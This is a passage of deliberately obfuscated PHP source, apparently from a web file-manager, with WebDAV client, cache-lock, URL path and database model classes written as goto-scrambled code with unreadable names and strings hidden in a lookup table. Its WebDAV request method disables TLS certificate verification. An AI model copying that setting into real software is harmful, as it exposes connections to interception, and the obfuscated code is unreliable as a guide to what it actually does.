ëÂ¥º‡Š[4], base64_decode(substr($BÓŠ´²ÏÕÔ, 6))); $B·îŠô‘ = isset($eİ»Õ¢¤÷Ü[0]) ? $eİ»Õ¢¤÷Ü[0] : $F ëÂ¥º‡Š[33]; $cĞ´Š¢­Šª = isset($eİ»Õ¢¤÷Ü[1]) ? $eİ»Õ¢¤÷Ü[1] : 0; } } return array($F ëÂ¥º‡Š[526] => $B·îŠô‘, $F ëÂ¥º‡Š[878] => $cĞ´Š¢­Šª); } public static function error() { goto EÕ…Éœõùá; dšÄ…‘õ–Î: die; goto f‡¢Öšµ‡Ğ; EÕ…Éœõùá: $Aå§ÄåÔÑ¢ =& $_SERVER[‘®…¢À]; header($Aå§ÄåÔÑ¢[1658]); header($Aå§ÄåÔÑ¢[1659]); goto b£›¿Š†«„; b£›¿Š†«„: header($Aå§ÄåÔÑ¢[1660]); header($Aå§ÄåÔÑ¢[1661]); header($Aå§ÄåÔÑ¢[1662]); goto dšÄ…‘õ–Î; f‡¢Öšµ‡Ğ: } public static function make($aÚñÖŸ³Ë–, $C‡ã‹ÄÓÔ) { $A¢ÆâÁ =& $_SERVER[‘®…¢À]; return $A¢ÆâÁ[1663] + base64_encode($aÚñÖŸ³Ë– . $A¢ÆâÁ[4] . $C‡ã‹ÄÓÔ); } } class HttpDavClient { public function __construct($b™¬–öà‰º, $Dƒì×‹³À©, $e°Æñ–áç) { $this->header = array(); $this->userName = $Dƒì×‹³À©; $this->userPassowrd = $e°Æñ–áç; } protected function makePath($C×ŒŸ”å…«) { return $C×ŒŸ”å…«; } protected function setHeader($f¡×ùÒ›‡, $bƒÈÌ×˜Åâ = false) { if ($bƒÈÌ×˜Åâ === !1) { $this->header[] = $f¡×ùÒ›‡; } else { $this->header[] = $f¡×ùÒ›‡ . $_SERVER[‘®…¢À][861] . $bƒÈÌ×˜Åâ; } } public function move($døí¢¸£Ğª, $AªÛ¥¯ˆ¾¤, $C‰ÓÅä§„‚ = '') { $d¨³ÙŒè½¶ =& $_SERVER[‘®…¢À]; $this->setHeader($d¨³ÙŒè½¶[1664], $this->makePath($AªÛ¥¯ˆ¾¤)); $this->setHeader($d¨³ÙŒè½¶[1665], $d¨³ÙŒè½¶[1666]); if ($C‰ÓÅä§„‚) { $this->setHeader($d¨³ÙŒè½¶[1667], $d¨³ÙŒè½¶[906] . $C‰ÓÅä§„‚ . $d¨³ÙŒè½¶[909]); } return $this->send($d¨³ÙŒè½¶[1668], $døí¢¸£Ğª); } public function copy($f¸ÎåìõŸ“, $D‚À©ğæˆŒ) { $B®§ŒŒ•Â =& $_SERVER[‘®…¢À]; $this->setHeader($B®§ŒŒ•Â[1664], $this->makePath($D‚À©ğæˆŒ)); $this->setHeader($B®§ŒŒ•Â[1665], $B®§ŒŒ•Â[1666]); return $this->send($B®§ŒŒ•Â[1669], $f¸ÎåìõŸ“); } public function mkcol($cçÂ‰¡õô») { $DÁªğ”š†Î =& $_SERVER[‘®…¢À]; $this->setHeader($DÁªğ”š†Î[1665], $DÁªğ”š†Î[1666]); return $this->send($DÁªğ”š†Î[1670], $cçÂ‰¡õô»); } public function delete($B‰¥¼ªÉ», $e„Â‘âÜĞÒ = '') { $dßŠåŠ ¬Á =& $_SERVER[‘®…¢À]; if ($e„Â‘âÜĞÒ) { $this->setHeader($dßŠåŠ ¬Á[1667], $dßŠåŠ ¬Á[906] . $e„Â‘âÜĞÒ . $dßŠåŠ ¬Á[909]); } return $this->send($dßŠåŠ ¬Á[1671], $B‰¥¼ªÉ»); } public function propfind($b £ìò×‰) { $E¥øºáÇ‡ =& $_SERVER[‘®…¢À]; $this->setHeader($E¥øºáÇ‡[1672], $E¥øºáÇ‡[84]); $this->setHeader($E¥øºáÇ‡[1673], $E¥øºáÇ‡[1674]); $dÒëâƒ÷äå = $E¥øºáÇ‡[1675]; return $this->send($E¥øºáÇ‡[1676], $b £ìò×‰, $dÒëâƒ÷äå); } public function options($d‚ÓÊŠÂ©) { return $this->send($_SERVER[‘®…¢À][1677], $d‚ÓÊŠÂ©); } public function get($E‰¦Ç£§‘) { return $this->send($_SERVER[‘®…¢À][213], $E‰¦Ç£§‘); } public function put($e‰ƒé¼ÎØö, $B¹’Ä—Ï·ø, $bá¾Î¨ß = '') { $bÚÕ‚·ğà =& $_SERVER[‘®…¢À]; if ($bá¾Î¨ß) { $this->setHeader($bÚÕ‚·ğà[1667], $bÚÕ‚·ğà[906] . $bá¾Î¨ß . $bÚÕ‚·ğà[909]); } return $this->send($bÚÕ‚·ğà[211], $e‰ƒé¼ÎØö, $B¹’Ä—Ï·ø); } protected function send($c‘çŸé‡êŸ, $BÂøê¶÷£­, $F‹è‘Á¨â = false, $f¼âØ…ğÙñ = false) { goto a¼‹é¾¤á; FÑÏœÙ„: $C×›ÙÉÁÙæ = curl_init($BÂøê¶÷£­); curl_setopt($C×›ÙÉÁÙæ, CURLOPT_CUSTOMREQUEST, $c‘çŸé‡êŸ); curl_setopt($C×›ÙÉÁÙæ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto BÍ¿—ÌÁÑò; D¤Úƒ: $this->header = array(); return $d¢Æù“×; goto cáŞêìÇğï; a›½¥áùÔ: $this->setHeader($cá°²¬Øèò); if ($F‹è‘Á¨â) { $F‹è‘Á¨â = $D‘Ü†ì¢ğÅ[1679] . $F‹è‘Á¨â; } if (!request_url_safe($BÂøê¶÷£­)) { return !1; } goto FÑÏœÙ„; a¼‹é¾¤á: $D‘Ü†ì¢ğÅ =& $_SERVER[‘®…¢À]; $cá°²¬Øèò = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($D‘Ü†ì¢ğÅ[1678], $D‘Ü†ì¢ğÅ[50]); goto a›½¥áùÔ; DÒãÍ»­Ğ‡: curl_setopt($C×›ÙÉÁÙæ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($C×›ÙÉÁÙæ, CURLOPT_SSL_VERIFYHOST, !1); $d¢Æù“× = curl_exec($C×›ÙÉÁÙæ); goto D¤Úƒ; BÍ¿—ÌÁÑò: curl_setopt($C×›ÙÉÁÙæ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($C×›ÙÉÁÙæ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($C×›ÙÉÁÙæ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto DÒãÍ»­Ğ‡; cáŞêìÇğï: } } goto C…ºò±ÏÙ¬; EÛ›²÷À„²: class CacheLockRedis { public function lock($Cë¢Ÿ“šœˆ, $aí‹’Ãó‹ù = 10) { $CÎ±Š¯ŠŠÉ = Cache::init(); $Aöº“‰Ï = microtime(!0) + $aí‹’Ãó‹ù; while (microtime(!0) < $Aöº“‰Ï) { $EÔªøë¸™š = $CÎ±Š¯ŠŠÉ->get($Cë¢Ÿ“šœˆ); if (!$EÔªøë¸™š) { $AìôÀ¥º = $CÎ±Š¯ŠŠÉ->setLock($Cë¢Ÿ“šœˆ, $Aöº“‰Ï, $aí‹’Ãó‹ù); if ($AìôÀ¥º) { return !0; } } else { if ($EÔªøë¸™š < microtime(!0)) { $CÎ±Š¯ŠŠÉ->set($Cë¢Ÿ“šœˆ, $Aöº“‰Ï, $Aöº“‰Ï); if ($CÎ±Š¯ŠŠÉ->get($Cë¢Ÿ“šœˆ) === $EÔªøë¸™š) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Aèã™¶°è) { return Cache::init()->get($Aèã™¶°è); } public function unlock($eøçš§áİŠ) { return Cache::init()->remove($eøçš§áİŠ); } } class CacheLockMemcached { public function lock($d–¸¢¦Â½, $f½µÊ¬èá = 0) { $FãæÕË¢é¦ = Cache::init(); $dõìÚ”ØÑ = microtime(!0) + $f½µÊ¬èá; while (microtime(!0) < $dõìÚ”ØÑ) { $Bâ§îÂÚ²‰ = $FãæÕË¢é¦->get($d–¸¢¦Â½); if (!$Bâ§îÂÚ²‰ || $Bâ§îÂÚ²‰ < microtime(!0)) { $Aêš× ŒÄ = $FãæÕË¢é¦->handle->add($d–¸¢¦Â½, $dõìÚ”ØÑ, $f½µÊ¬èá); if ($Aêš× ŒÄ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($aÁ×íâ†Ä¼) { return Cache::init()->get($aÁ×íâ†Ä¼); } public function unlock($C‡Ş°òÈö•) { return Cache::init()->remove($C‡Ş°òÈö•); } } class CacheLockDatabase { public function lock($bïßÍƒÏÏº, $fèï‹õÔ = 0) { $A˜¨Ÿ¨‘Ã‡ = Model($_SERVER[‘®…¢À][738]); $f¤„­™Ì”É = microtime(!0) + $fèï‹õÔ; while (microtime(!0) < $f¤„­™Ì”É) { $c½Öá÷óˆ» = $A˜¨Ÿ¨‘Ã‡->get($bïßÍƒÏÏº); if (!$c½Öá÷óˆ» || $c½Öá÷óˆ» < microtime(!0)) { $bºÖËˆºÉ = $A˜¨Ÿ¨‘Ã‡->set($bïßÍƒÏÏº, $f¤„­™Ì”É); if ($bºÖËˆºÉ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($CÁµ•Ç„¶ô) { return Model($_SERVER[‘®…¢À][738])->get($CÁµ•Ç„¶ô); } public function unlock($eŠÈ”ÄÃŸ£) { Model($_SERVER[‘®…¢À][738])->remove($eŠÈ”ÄÃŸ£); } } goto a’Ô˜Çªé©; B“Ï¡À¥ì: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Cæƒ°ˆ¢ğ = false) { } public function exist($c„Ëœ¡š÷Á) { $F¢íÑ¸¥ = $this->info($c„Ëœ¡š÷Á); return $F¢íÑ¸¥[$_SERVER[‘®…¢À][185]]; } public function isFile($F­»ƒ¾ªñŒ) { $E–‰‹ØìÁ = $this->info($F­»ƒ¾ªñŒ); return $E–‰‹ØìÁ[$_SERVER[‘®…¢À][185]]; } public function isFolder($BµÂÄÖ¼©¶) { return !1; } public function size($bÌöì¢ƒÜ§) { $E™‚Êê©ë = $this->info($bÌöì¢ƒÜ§); return $E™‚Êê©ë[$_SERVER[‘®…¢À][78]]; } public function info($Bîô¶Ä÷½’) { return $this->infoParse($Bîô¶Ä÷½’); } public function infoAuth($b¬ÔÚ¦ªŸ) { return $this->infoParse($b¬ÔÚ¦ªŸ); } public function infoWithChildren($a„¼ÙÀ‘Ÿ) { return $this->infoParse($a„¼ÙÀ‘Ÿ); } public function infoFull($e‘Õ†Å¬’·) { return $this->infoParse($e‘Õ†Å¬’·); } private function infoParse($FÚ…ìßóÈì) { $eÔšĞ×¾ô„ =& $_SERVER[‘®…¢À]; $C­‘œ°©øî = $this->header($FÚ…ìßóÈì); if (!$C­‘œ°©øî || !$C­‘œ°©øî[$eÔšĞ×¾ô„[662]]) { return !1; } $A»ôéîêÉŒ = _get($C­‘œ°©øî, $eÔšĞ×¾ô„[322], 0); $aè§áø‚· = array($eÔšĞ×¾ô„[28] => $C­‘œ°©øî[$eÔšĞ×¾ô„[28]], $eÔšĞ×¾ô„[76] => $FÚ…ìßóÈì, $eÔšĞ×¾ô„[29] => $eÔšĞ×¾ô„[164], $eÔšĞ×¾ô„[78] => intval($A»ôéîêÉŒ), $eÔšĞ×¾ô„[157] => get_path_ext($C­‘œ°©øî[$eÔšĞ×¾ô„[28]]), $eÔšĞ×¾ô„[1112] => $A»ôéîêÉŒ > 0 && $C­‘œ°©øî[$eÔšĞ×¾ô„[1192]], $eÔšĞ×¾ô„[1113] => !1); return $aè§áø‚·; } private function header($BÎ³ ªçîè) { if (isset(self::$_cacheHeader[$BÎ³ ªçîè])) { return self::$_cacheHeader[$BÎ³ ªçîè]; } self::$_cacheHeader[$BÎ³ ªçîè] = url_header($BÎ³ ªçîè); return self::$_cacheHeader[$BÎ³ ªçîè]; } public function hashSimple($E¦•Ğã†º, $aù‘¬Ø”¦ñ = false) { goto D®™¦ÎŞ®³; DŠù¹Ğ³‘: $d÷»òÏ‘»œ = timeFloat(); $e¥ŒÊ£Ú÷É = 15; for ($d¾ÏÀ¾òÉÓ = 0; $d¾ÏÀ¾òÉÓ < $b‚Ü™‡ŞÎî; $d¾ÏÀ¾òÉÓ++) { if (timeFloat() - $d÷»òÏ‘»œ > $e¥ŒÊ£Ú÷É) { return !1; } $b…‹‹É©«ô = $this->fileSubstr($E¦•Ğã†º, $EòÑÍÜŠ¦À * $d¾ÏÀ¾òÉÓ, $C‰Ú­ÉÙºó); if (!$b…‹‹É©«ô) { return !1; } $B¨Û°‚×Åµ .= $b…‹‹É©«ô; } goto CêùåÙëÍ‘; aòÑîœƒ›õ: if ($Bé‹æøÇØŞ <= $C‰Ú­ÉÙºó * $b‚Ü™‡ŞÎî) { return md5($this->fileSubstr($E¦•Ğã†º, 0, $Bé‹æøÇØŞ)) . $Bé‹æøÇØŞ; } $EòÑÍÜŠ¦À = intval($Bé‹æøÇØŞ / $b‚Ü™‡ŞÎî); $B¨Û°‚×Åµ = $cÊÆİğÉì[33]; goto DŠù¹Ğ³‘; D®™¦ÎŞ®³: $cÊÆİğÉì =& $_SERVER[‘®…¢À]; $DÉ´º½²Ô„ = $this->info($E¦•Ğã†º); if (!$DÉ´º½²Ô„ || !$DÉ´º½²Ô„[$cÊÆİğÉì[185]]) { return !1; } goto fåƒ½ÈÍš¢; fåƒ½ÈÍš¢: $Bé‹æøÇØŞ = $DÉ´º½²Ô„[$cÊÆİğÉì[78]]; $C‰Ú­ÉÙºó = 200; $b‚Ü™‡ŞÎî = 50; goto aòÑîœƒ›õ; CêùåÙëÍ‘: $B¨Û°‚×Åµ .= $this->fileSubstr($E¦•Ğã†º, $Bé‹æøÇØŞ - $C‰Ú­ÉÙºó, $C‰Ú­ÉÙºó); return md5($B¨Û°‚×Åµ) . $Bé‹æøÇØŞ; goto dµÈ™ÄğÏÆ; dµÈ™ÄğÏÆ: } public function getContent($C›õŒƒ°õ) { return $this->fileSubstr($C›õŒƒ°õ); } public function fileSubstr($fëÏ²Ö‚Üš, $dõ¿œŠÉ´Î = 0, $C×­ÚµèÅ = -1) { goto eÊšÆ‚¿óÔ; eÊšÆ‚¿óÔ: $c¤¤®ÎºØ˜ =& $_SERVER[‘®…¢À]; $d†ãÒ•Ò = $this->info($fëÏ²Ö‚Üš); if (!$d†ãÒ•Ò || !$d†ãÒ•Ò[$c¤¤®ÎºØ˜[185]] && $d†ãÒ•Ò[$c¤¤®ÎºØ˜[78]] > 1024 * 1024 * 10) { return !1; } goto cåäÂ÷ÜÂ; cåäÂ÷ÜÂ: if ($C×­ÚµèÅ === -1) { $C×­ÚµèÅ = $d†ãÒ•Ò[$c¤¤®ÎºØ˜[78]]; } if ($C×­ÚµèÅ == 0) { return $c¤¤®ÎºØ˜[33]; } $A÷Ô³¿ï‚Œ = array($c¤¤®ÎºØ˜[1193] . $dõ¿œŠÉ´Î . $c¤¤®ÎºØ˜[686] . ($dõ¿œŠÉ´Î + $C×­ÚµèÅ - 1)); goto AáÇÈ„„Æì; AáÇÈ„„Æì: $e¥Ìø‹„±‹ = url_request($fëÏ²Ö‚Üš, $c¤¤®ÎºØ˜[213], !1, $A÷Ô³¿ï‚Œ, !1, !1, 1); return $e¥Ìø‹„±‹[$c¤¤®ÎºØ˜[992]] ? $e¥Ìø‹„±‹[$c¤¤®ÎºØ˜[992]] : $c¤¤®ÎºØ˜[33]; goto A­¢ŠÇº‰Ò; A­¢ŠÇº‰Ò: } public function download($E°–õšÖ‚§, $e¾šç¸…˜œ) { Downloader::start($E°–õšÖ‚§, $e¾šç¸…˜œ); return $e¾šç¸…˜œ; } } $CÖæ„Ñ«‘ = LIB_DIR . $_SERVER[‘®…¢À][1194]; $c¸¬¡îØÎ™ = $_SERVER[‘®…¢À][1195]; goto DòÁ˜àî—Æ; cİÒË¡²¿: define($_SERVER[‘®…¢À][1832], 4); define($_SERVER[‘®…¢À][1833], 5); define($_SERVER[‘®…¢À][1834], 16); goto eµ„ÓºöÙŸ; D°Ö³ŒáÎ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\x66\171\124\x69\x6d\145", "\164\x69\x6d\x65", "\151\156\163\x65\x72\164\54\x75\160\144\141\164\145", "\x66\165\x6e\143\164\x69\x6f\156"), array("\143\162\x65\141\x74\145\124\151\x6d\145", "\x74\151\155\145", "\151\156\x73\x65\162\164", "\x66\x75\156\x63\164\x69\157\156")); public function setDataAuto($B˜£¦Öë„) { $this->dataAuto = $B˜£¦Öë„; } public function __construct($fæ‰šééÕ¬ = '', $C¢‹º£¡Ú¤ = '', $e¬í¨‚¬È‹ = '') { parent::__construct($fæ‰šééÕ¬, $C¢‹º£¡Ú¤, $e¬í¨‚¬È‹); } public static function textEncode($DåºØºŸôï) { if (!$DåºØºŸôï) { return $DåºØºŸôï; } $A¶’×Ÿñƒ = json_encode($DåºØºŸôï); $A¶’×Ÿñƒ = preg_replace_callback($_SERVER[‘®…¢À][338], function ($B¼Ä¶ÕáÒ½) { return addslashes($B¼Ä¶ÕáÒ½[0]); }, $A¶’×Ÿñƒ); return json_decode($A¶’×Ÿñƒ); } public static function textDecode($f´Ø™æé£¾) { $Cİ†‚Ö–¤ =& $_SERVER[‘®…¢À]; $a…·ğ“Ç®á = json_encode($f´Ø™æé£¾); $a…·ğ“Ç®á = preg_replace_callback($Cİ†‚Ö–¤[339], function ($E°˜Ñ‚¯Œƒ) { return $_SERVER[‘®…¢À][96]; }, $a…·ğ“Ç®á); return json_decode($a…·ğ“Ç®á); } protected $tableMeta = array(); protected function _beforeInsert(&$dëá†…Ø·, $c½Ï‘õ¼©) { $F„‘¯µêÁ =& $_SERVER[‘®…¢À]; if (!$this->checkDataAutoHas($F„‘¯µêÁ[340])) { return; } $this->dataBeforeFilter($dëá†…Ø·, $F„‘¯µêÁ[340]); } protected function _beforeUpdate(&$F«äà¸‡Í, $EŠ„¢®­¾ß) { $f‚ã¹Éì’ã =& $_SERVER[‘®…¢À]; if (!$this->checkDataAutoHas($f‚ã¹Éì’ã[341])) { return; } $this->dataBeforeFilter($F«äà¸‡Í, $f‚ã¹Éì’ã[341]); } protected function _afterSelect(&$E¯í”Ëá¼ë, $e÷„Ó³§»Ã) { if (!is_array($E¯í”Ëá¼ë)) { return; } if (!$this->checkDataAutoHas($_SERVER[‘®…¢À][342])) { return; } foreach ($E¯í”Ëá¼ë as &$Bôöà ¶Í) { $this->dataAfterFilter($Bôöà ¶Í); } } protected function _afterFind(&$B‡²¢ÄöŸ, $cÍ÷´ğì×) { if (!is_array($B‡²¢ÄöŸ)) { return; } if (!$this->checkDataAutoHas($_SERVER[‘®…¢À][342])) { return; } $this->dataAfterFilter($B‡²¢ÄöŸ); } public function setAutoIncrement($E¢ñˆ†İÇ÷) { $CÊ¤ïß±Ä = array($this->getPk() => $E¢ñˆ†İÇ÷); $fé‚ãÜäİ = $this->data($CÊ¤ïß±Ä)->add(); if ($fé‚ãÜäİ) { $this->delete($fé‚ãÜäİ); } } public function getAutoIncrement() { $c²İ×Ü´Ó„ = $this->getTableName(); $Cä—É¯””› = $this->max($this->getPk()); $fˆ’õŒĞÉÖ = $this->query("\163\150\157\x77\x20\164\x61\x62\154\x65\x20\x73\x74\x61\x74\x75\163\40\x77\x68\145\162\145\40\x4e\x61\155\145\75\x27{$c²İ×Ü´Ó„}\47"); $F¿÷Ò¶‚ã‚ = $fˆ’õŒĞÉÖ[0][$_SERVER[‘®…¢À][343]]; $dÈ©Ïôõ©× = max($Cä—É¯””›, $F¿÷Ò¶‚ã‚); return $dÈ©Ïôõ©×; } protected function _callBefore($a´ÉÃî¨î—, $câğÔãŠØƒ) { return $this->cacheCallCheck($a´ÉÃî¨î—, $câğÔãŠØƒ, !1); } protected function _callAfter($Bîå‹Å¶µµ, $d‘áÖ²Ğ) { return $this->cacheCallCheck($Bîå‹Å¶µµ, $d‘áÖ²Ğ, !0); } protected function cacheFunctionAlias($DÊ›˜ºÃËæ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Bä±®¥Ô¹¤, $c¥õ©ØÅø, $E¼„ØŞÛÌì = false) { $bê¡ÄŠĞÑË = $this->cacheFunctionAlias($c¥õ©ØÅø); if (!$bê¡ÄŠĞÑË) { return; } foreach ($bê¡ÄŠĞÑË as $dÌ¡º–ØĞæ => $aœ×¬ÁÅ—) { $C‚ÏĞé©º = $aœ×¬ÁÅ—[0]; $aİ½º–À«ó = explode($_SERVER[‘®…¢À][47], $aœ×¬ÁÅ—[1]); if ($Bä±®¥Ô¹¤ == $dÌ¡º–ØĞæ) { return $this->cacheFunctionGet($dÌ¡º–ØĞæ, $C‚ÏĞé©º); } if ($E¼„ØŞÛÌì && in_array($Bä±®¥Ô¹¤, $aİ½º–À«ó)) { $this->cacheFunctionClear($dÌ¡º–ØĞæ, $C‚ÏĞé©º); } } } public function cacheFunctionGet($F©­Ù—§ÌË, $dİè‹…â©´) { $c‘É˜œÖŠ = $this->cacheKeyMake($F©­Ù—§ÌË, $dİè‹…â©´); $cºÏîæ“Íº = Cache::get($c‘É˜œÖŠ); if (!is_array($cºÏîæ“Íº)) { $cºÏîæ“Íº = call_user_func_array(array($this, $F©­Ù—§ÌË), array($dİè‹…â©´, !0)); Cache::set($c‘É˜œÖŠ, $cºÏîæ“Íº); } return $cºÏîæ“Íº; } public function cacheFunctionClear($CÆ‡–Š›, $b…·˜µñ•ä) { $eÀ‹öÂô = $b…·˜µñ•ä; if (!is_array($b…·˜µñ•ä)) { $eÀ‹öÂô = array($b…·˜µñ•ä); } foreach ($eÀ‹öÂô as $eáîØ”â°Å) { $A‘‹éÛ±Ğ = $this->cacheKeyMake($CÆ‡–Š›, $eáîØ”â°Å); Cache::remove($A‘‹éÛ±Ğ); } } private function cacheKeyMake($B—¾Ú¡•öµ, $Bæƒ¦Ï¨‘°) { $bƒóÂáµì• =& $_SERVER[‘®…¢À]; return get_class($this) . $bƒóÂáµì•[71] . $B—¾Ú¡•öµ . $bƒóÂáµì•[344] . $Bæƒ¦Ï¨‘°; } protected function selectPage($eªÒ¿ÔÍğ¨ = 200, $eŞµÁ°Õïª = 1) { goto F…‡‰‰öÆñ; Eù§Å®“‡÷: $this->optionsValue($B¤Í…çê±‡); $EšÀ·½¿„ = $this->page($eŞµÁ°Õïª, $eªÒ¿ÔÍğ¨)->select(); if ($Aó‰”ÜÚ¦ == 1) { $BëñÊ›Û¿Ê = count($EšÀ·½¿„); } goto EÙ±æ­øä‘; FŞøÅ†§Ç¥: $AÓñ¹¨¢… = $B¤Í…çê±‡; $AÓñ¹¨¢…[$A™İ™Ü²ç[346]] = array(); $this->optionsValue($AÓñ¹¨¢…); goto A§ëÄƒšô; cöºŞ¸é“: $e¹É™ëÜİ‰ = 4000; $eªÒ¿ÔÍğ¨ = isset($in[$A™İ™Ü²ç[345]]) ? $in[$A™İ™Ü²ç[345]] : $eªÒ¿ÔÍğ¨; if ($eªÒ¿ÔÍğ¨ === -1) { unset($in[$A™İ™Ü²ç[345]]); $e¹É™ëÜİ‰ = 100000000; $eªÒ¿ÔÍğ¨ = $e¹É™ëÜİ‰; } goto FŞøÅ†§Ç¥; EÙ±æ­øä‘: $fç…ğò«Ä½ = array($A™İ™Ü²ç[347] => array($A™İ™Ü²ç[348] => $BëñÊ›Û¿Ê, $A™İ™Ü²ç[345] => $eªÒ¿ÔÍğ¨, $A™İ™Ü²ç[336] => $eŞµÁ°Õïª, $A™İ™Ü²ç[349] => $Aó‰”ÜÚ¦), $A™İ™Ü²ç[350] => $EšÀ·½¿„ ? $EšÀ·½¿„ : array()); return $fç…ğò«Ä½; goto cÜˆŠĞšç; F…‡‰‰öÆñ: $A™İ™Ü²ç =& $_SERVER[‘®…¢À]; global $in; $B¤Í…çê±‡ = $this->optionsValue(); goto cöºŞ¸é“; cˆ¤ÇÄ „: $Aó‰”ÜÚ¦ = ceil($BëñÊ›Û¿Ê / $eªÒ¿ÔÍğ¨); $eŞµÁ°Õïª = intval(isset($in[$A™İ™Ü²ç[336]]) ? $in[$A™İ™Ü²ç[336]] : $eŞµÁ°Õïª); $eŞµÁ°Õïª = $eŞµÁ°Õïª <= 1 ? 1 : ($eŞµÁ°Õïª >= $Aó‰”ÜÚ¦ ? $Aó‰”ÜÚ¦ : $eŞµÁ°Õïª); goto Eù§Å®“‡÷; A§ëÄƒšô: $BëñÊ›Û¿Ê = intval($this->count()); $eªÒ¿ÔÍğ¨ = intval($eªÒ¿ÔÍğ¨); $eªÒ¿ÔÍğ¨ = $eªÒ¿ÔÍğ¨ <= 5 ? 5 : ($eªÒ¿ÔÍğ¨ >= $e¹É™ëÜİ‰ ? $e¹É™ëÜİ‰ : $eªÒ¿ÔÍğ¨); goto cˆ¤ÇÄ „; cÜˆŠĞšç: } protected function checkLength($EÅì±ÚßŸÊ, $b¼Ó©´†Œ = 0, $e®àÌÙì£á = '') { $bÆÉµÈ®¡„ =& $_SERVER[‘®…¢À]; $b¼Ó©´†Œ = $b¼Ó©´†Œ ? $b¼Ó©´†Œ : 65536; if (!$EÅì±ÚßŸÊ || strlen($EÅì±ÚßŸÊ) < $b¼Ó©´†Œ) { return; } $e®àÌÙì£á = $e®àÌÙì£á ? $e®àÌÙì£á . $bÆÉµÈ®¡„[68] : $bÆÉµÈ®¡„[33]; show_json($e®àÌÙì£á . LNG($bÆÉµÈ®¡„[351]) . "\50{$b¼Ó©´†Œ}\51", !1); } protected function metaSet($eÂöïéŞÒ, $dÌÇÇİâ‘ƒ = null, $DÎÂê¿‡¡ = null) { goto E„»¶¹ÙÏ; e¤º°à¿¥Ç: if (is_string($dÌÇÇİâ‘ƒ)) { $F”æê’‹­œ[$dÌÇÇİâ‘ƒ] = $DÎÂê¿‡¡; } $b…Ûš©Å›Æ = array(); foreach ($F”æê’‹­œ as $CÇò•Üç => $E³öøÌÍØ‰) { $this->checkLength($E³öøÌÍØ‰, !1, $Fî«‹ñÙÕ¤ . $a³Ãš”ôåà[4] . $CÇò•Üç); $b…Ûš©Å›Æ[] = array($B£ï ŠÚ©á => $eÂöïéŞÒ, $a³Ãš”ôåà[90] => $CÇò•Üç, $a³Ãš”ôåà[355] => $E³öøÌÍØ‰); } goto d¡Ñ‚ÌöÕ›; E„»¶¹ÙÏ: $a³Ãš”ôåà =& $_SERVER[‘®…¢À]; if (!$this->tableMeta) { return !1; } $B£ï ŠÚ©á = $this->tableMeta[$a³Ãš”ôåà[352]]; goto c†ÂÓƒÌª; c†ÂÓƒÌª: $Fî«‹ñÙÕ¤ = $this->tableMeta[$a³Ãš”ôåà[353]]; $C•‹á¤ê½‰ = Model($Fî«‹ñÙÕ¤); $AÄÑàšÆé¦ = array($B£ï ŠÚ©á => $eÂöïéŞÒ, $a³Ãš”ôåà[354] => $dÌÇÇİâ‘ƒ); goto fï¶ç÷›«¼; fï¶ç÷›«¼: if (is_null($dÌÇÇİâ‘ƒ)) { return $C•‹á¤ê½‰->where(array($B£ï ŠÚ©á => $eÂöïéŞÒ))->delete(); } if (is_null($DÎÂê¿‡¡)) { return $C•‹á¤ê½‰->where($AÄÑàšÆé¦)->delete(); } $F”æê’‹­œ = is_array($dÌÇÇİâ‘ƒ) ? $dÌÇÇİâ‘ƒ : array(); goto e¤º°à¿¥Ç; d¡Ñ‚ÌöÕ›: $C•‹á¤ê½‰->where(array($B£ï ŠÚ©á => $eÂöïéŞÒ))->addAll($b…Ûš©Å›Æ, array(), !0); return !0; goto Fò—õªÌ; Fò—õªÌ: } public function metaGet($dé¼˜ñ•»´) { goto fˆ‰¤Ãšê; Añ§¾Ïîßì: $B”Õ¤Ã•òÄ = Model($this->tableMeta[$F¿Ô°°ÜÕÆ[353]]); $D¤Ã†Òä = array($fõ•èÉíÊé => $dé¼˜ñ•»´); $déÇ©…­¤‰ = $B”Õ¤Ã•òÄ->field($F¿Ô°°ÜÕÆ[356])->where($D¤Ã†Òä)->select(); goto d…„èÇæ´×; d…„èÇæ´×: $déÇ©…­¤‰ = array_to_keyvalue($déÇ©…­¤‰, $F¿Ô°°ÜÕÆ[90], $F¿Ô°°ÜÕÆ[355]); return $déÇ©…­¤‰; goto EšÕÇàÒË; fˆ‰¤Ãšê: $F¿Ô°°ÜÕÆ =& $_SERVER[‘®…¢À]; if (!$this->tableMeta) { return array(); } $fõ•èÉíÊé = $this->tableMeta[$F¿Ô°°ÜÕÆ[352]]; goto Añ§¾Ïîßì; EšÕÇàÒË: } private function checkDataAutoHas($fÎ‘ƒ¡‡Ö) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $FÅ‡¾—“ó) { if (in_array($fÎ‘ƒ¡‡Ö, explode($_SERVER[‘®…¢À][47], $FÅ‡¾—“ó[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$aŸ£¨³¿, $aÕ÷éãÂÑ©) { $AÚ¿‡Ëïµ± =& $_SERVER[‘®…¢À]; foreach ($this->dataAuto as $eÍõÃäÇã‡) { $AÅãŒ¿ˆ‰ = $eÍõÃäÇã‡[0]; if (!in_array($aÕ÷éãÂÑ©, explode($AÚ¿‡Ëïµ±[47], $eÍõÃäÇã‡[2]))) { continue; } switch (trim($eÍõÃäÇã‡[3])) { case $AÚ¿‡Ëïµ±[306]: case $AÚ¿‡Ëïµ±[307]: $B“Ü×çå± = $eÍõÃäÇã‡[1]; $EªË¬ÚÂÒº = isset($eÍõÃäÇã‡[4]) ? (array) $eÍõÃäÇã‡[4] : array(); if ($B“Ü×çå± == $AÚ¿‡Ëïµ±[187] && array_key_exists($AÅãŒ¿ˆ‰, $aŸ£¨³¿)) { if (!$aŸ£¨³¿[$AÅãŒ¿ˆ‰]) { unset($aŸ£¨³¿[$AÅãŒ¿ˆ‰]); } break; } if 